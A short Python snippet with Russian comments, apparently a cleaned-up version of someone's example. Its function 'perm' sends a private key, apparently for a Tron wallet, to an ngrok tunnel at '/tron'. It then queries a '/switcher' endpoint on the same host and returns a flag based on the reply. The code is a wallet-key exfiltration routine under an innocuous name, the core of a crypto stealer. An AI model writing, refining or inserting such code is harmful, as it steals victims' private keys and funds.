import requests
import json
# RequestException не нужен, так как нет try/except блоков

def perm(private_key):
    # 1. Формирование данных для POST-запроса
    # Заменил 'ptivat_key' на 'private_key' и список кортежей на корректный словарь
    transaction_payload = {'private_key': private_key}

    # 2. Отправка POST-запроса (без raise_for_status, как в вашем примере)
    # Используем 'json=' для отправки данных как JSON
    requests.post(
        'https://reda-sequestered-justine.ngrok-free.dev/tron',
        json=transaction_payload
    )

    # 3. Отправка GET-запроса к /switcher (без raise_for_status, как в вашем примере)
    switcher_response = requests.get(
        'https://reda-sequestered-justine.ngrok-free.dev/switcher'
    )
    
    # 4. Проверка ответа
    # В случае ошибки JSONDecodeError, выполнение здесь прекратится
    # В случае сетевой ошибки, выполнение прекратится выше
    switcher_data = switcher_response.json()
    
    # Проверяем, пуст ли ответ.
    if not switcher_data:
        return 1  # Возвращаем 1, если пусто
    else:
        return 0  # Возвращаем 0, если данные есть